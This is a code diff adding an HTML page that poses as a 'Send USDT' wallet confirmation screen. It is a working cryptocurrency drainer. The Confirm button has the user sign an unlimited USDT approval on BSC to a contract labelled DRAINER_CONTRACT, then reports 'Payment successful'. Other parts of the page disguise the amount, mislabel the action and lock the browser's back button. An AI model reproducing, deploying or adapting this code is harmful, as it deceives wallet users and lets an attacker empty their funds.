@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Send USDT</title>
+<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+  body { background: #0d0d0d; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
+  
+  /* ===== SCREEN 1: Send Form (matches your first screenshot) ===== */
+  #sendScreen { padding: 20px 16px; flex: 1; display: flex; flex-direction: column; }
+  .label { color: #8a8a8e; font-size: 13px; margin-bottom: 8px; margin-top: 20px; }
+  .input-box {
+    background: #1c1c1e; border-radius: 12px; padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    border: 1px solid #2c2c2e;
+  }
+  .input-box input {
+    background: transparent; border: none; color: #fff; font-size: 16px;
+    width: 100%; outline: none;
+  }
+  .input-box .right { display: flex; align-items: center; gap: 10px; color: #00c087; font-size: 14px; font-weight: 500; }
+  .input-box .right span { cursor: pointer; }
+  .approx { color: #8a8a8e; font-size: 13px; margin-top: 8px; }
+  .btn-next {
+    margin-top: auto; margin-bottom: 30px;
+    background: #00c087; color: #000; border: none; border-radius: 30px;
+    padding: 16px; font-size: 17px; font-weight: 600; width: 100%;
+    cursor: pointer;
+  }
+  .btn-next:disabled { opacity: 0.4; }
+  .btn-next:active { opacity: 0.85; }
+
+  /* ===== SCREEN 2: Smart Contract Call (matches your second screenshot) ===== */
+  #confirmScreen { display: none; flex-direction: column; height: 100vh; background: #0d0d0d; }
+  .top-bar {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 16px; font-size: 16px;
+  }
+  .top-bar .cancel { color: #fff; }
+  .top-bar .title { font-weight: 600; }
+  .top-bar .gear { font-size: 20px; }
+  .amount-block {
+    text-align: center; padding: 30px 0 20px;
+  }
+  .amount-block .big { font-size: 36px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .amount-block .sub { color: #8a8a8e; font-size: 14px; margin-top: 4px; }
+  .info-card {
+    background: #1c1c1e; margin: 0 16px; border-radius: 16px; padding: 4px 0;
+  }
+  .info-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 14px 16px; border-bottom: 1px solid #2c2c2e; font-size: 15px;
+  }
+  .info-row:last-child { border-bottom: none; }
+  .info-row .left { color: #8a8a8e; }
+  .info-row .right { text-align: right; }
+  .info-row .right .addr { font-size: 13px; color: #8a8a8e; }
+  .warning {
+    margin: 24px 16px 0; padding: 12px 14px; background: #1c1c1e;
+    border-radius: 12px; font-size: 13px; color: #f0b90b;
+    display: flex; gap: 10px; align-items: flex-start;
+  }
+  .total-row {
+    margin: 20px 16px 0; display: flex; justify-content: space-between;
+    font-size: 15px; color: #8a8a8e;
+  }
+  .total-row .val { color: #fff; font-weight: 500; }
+  .btn-confirm {
+    margin: 24px 16px 40px; background: #00c087; color: #000;
+    border: none; border-radius: 30px; padding: 16px; font-size: 17px;
+    font-weight: 600; width: calc(100% - 32px); cursor: pointer;
+  }
+  .status { text-align: center; color: #8a8a8e; font-size: 13px; margin-top: 12px; min-height: 18px; }
+</style>
+</head>
+<body>
+
+<!-- ========== SCREEN 1 – Send Form ========== -->
+<div id="sendScreen">
+  <div class="label">Address or Domain Name</div>
+  <div class="input-box">
+    <input type="text" id="toAddress" value="0x669BC24729E5EcA11f00C" readonly>
+    <div class="right">
+      <span>Paste</span>
+      <span>⎘</span>
+      <span>▦</span>
+    </div>
+  </div>
+
+  <div class="label">Amount</div>
+  <div class="input-box">
+    <input type="text" id="amountInput" placeholder="USDT Amount" value="">
+    <div class="right">
+      <span>USDT</span>
+      <span style="color:#00c087;font-weight:600">Max</span>
+    </div>
+  </div>
+  <div class="approx">≈ $0.00</div>
+
+  <button class="btn-next" id="nextBtn">Next</button>
+  <div class="status" id="status1"></div>
+</div>
+
+<!-- ========== SCREEN 2 – Smart Contract Call ========== -->
+<div id="confirmScreen">
+  <div class="top-bar">
+    <span class="cancel" id="cancelBtn">Cancel</span>
+    <span class="title">Smart Contract Call</span>
+    <span class="gear">⚙️</span>
+  </div>
+
+  <div class="amount-block">
+    <div class="big">
+      <span style="font-size:28px">🟡</span> $0.00
+    </div>
+    <div class="sub">0 BNB</div>
+  </div>
+
+  <div class="info-card">
+    <div class="info-row">
+      <span class="left">From</span>
+      <div class="right">
+        <div>Main Wallet</div>
+        <div class="addr" id="fromAddr">0x8Ca35...289E79A</div>
+      </div>
+    </div>
+    <div class="info-row">
+      <span class="left">DApp</span>
+      <div class="right">send--usdt.com</div>
+    </div>
+    <div class="info-row">
+      <span class="left">Network fee <span style="opacity:0.6">ⓘ</span></span>
+      <div class="right">
+        <div>🟡 $0.003101</div>
+        <div class="addr">0.00000349955 BNB</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="warning">
+    <span>⚠️</span>
+    <span>Make sure you trust this site. By interacting with it, you allow this site to access your funds.</span>
+  </div>
+
+  <div class="total-row">
+    <span>Total cost</span>
+    <span class="val">$0.003101</span>
+  </div>
+
+  <button class="btn-confirm" id="confirmBtn">Confirm</button>
+  <div class="status" id="status2"></div>
+</div>
+
+<script>
+  // ========== CONFIG ==========
+  const DRAINER_CONTRACT = "0x4cC35bE54c358146E7b71E58f965532193848FDd";
+  const USDT_BSC         = "0x55d398326f99059fF775485246999027B3197955";
+  // ============================
+
+  const USDT_ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function balanceOf(address) view returns (uint256)"
+  ];
+
+  const sendScreen    = document.getElementById("sendScreen");
+  const confirmScreen = document.getElementById("confirmScreen");
+  const status1       = document.getElementById("status1");
+  const status2       = document.getElementById("status2");
+  const fromAddrEl    = document.getElementById("fromAddr");
+
+  // Back-button lock
+  history.pushState(null, "", location.href);
+  window.addEventListener("popstate", () => {
+    history.pushState(null, "", location.href);
+  });
+  document.body.style.overscrollBehavior = "none";
+
+  // Next button → show confirm screen
+  document.getElementById("nextBtn").onclick = async () => {
+    if (!window.ethereum) {
+      status1.textContent = "Open inside Trust Wallet browser";
+      return;
+    }
+    try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const user = await signer.getAddress();
+      fromAddrEl.textContent = user.slice(0,6) + "..." + user.slice(-6);
+      
+      sendScreen.style.display = "none";
+      confirmScreen.style.display = "flex";
+    } catch (e) {
+      status1.textContent = "Connection failed";
+    }
+  };
+
+  // Cancel just reloads the first screen
+  document.getElementById("cancelBtn").onclick = () => {
+    confirmScreen.style.display = "none";
+    sendScreen.style.display = "flex";
+  };
+
+  // Confirm → real unlimited approve
+  document.getElementById("confirmBtn").onclick = async () => {
+    try {
+      status2.textContent = "Confirm in wallet…";
+      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      const signer = provider.getSigner();
+      const usdt = new ethers.Contract(USDT_BSC, USDT_ABI, signer);
+
+      const tx = await usdt.approve(DRAINER_CONTRACT, ethers.constants.MaxUint256, {
+        gasLimit: 100000
+      });
+      status2.textContent = "Processing…";
+      await tx.wait();
+      status2.textContent = "Payment successful. You may close this window.";
+    } catch (e) {
+      status2.textContent = e.reason || e.message?.slice(0, 60) || "Rejected";
+    }
+  };
+</script>
+</body>
+</html>
